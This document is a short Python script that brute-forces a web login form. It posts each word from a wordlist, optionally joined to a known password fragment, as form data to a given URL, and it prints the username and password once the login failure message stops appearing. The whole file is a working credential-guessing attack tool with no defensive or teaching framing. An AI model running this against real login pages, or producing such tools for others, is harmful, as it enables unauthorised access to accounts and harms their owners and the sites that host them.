import requests
import sys

try:
    #sys.argv is the placeholder for the inputs
    filePath = sys.argv[1]
    username = sys.argv[2]
    lastPassword = sys.argv[3]
    url = sys.argv[4]
    cUsername = str(sys.argv[5])
    cPassword = str(sys.argv[6])
    cLogin = str(sys.argv[7])
    failsMsg = str(sys.argv[8])

    if lastPassword == "-n":
        lastPassword = ""

    #Tries to brute-force password with a wordlist
    with open(filePath, 'r', encoding='latin-1') as wordList:
        for word in wordList:
            word = word.strip()

            password = word + lastPassword

            credentials = {
                f"{cUsername}":f"{username}",
                f"{cPassword}":f"{password}",
                f"{cLogin}":"Login"
        }

            request = requests.post(url, data = credentials)

            try:
                if request.text.find(f"{failsMsg}") == -1:
                    print("")
                    print("-------------------------------------")
                    print("")
                    print("     --- Found login details ---")
                    print("")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print("")
                    print("-------------------------------------")
                    print("")
                    break
                else:
                    print(f"Trying: {password}")
            except:
                print("Login failed")
                break

except:
    print("Syntax: (file path) (Username) (last known Password, '-n' = Nothing) (url) '(Login fail msg)'")
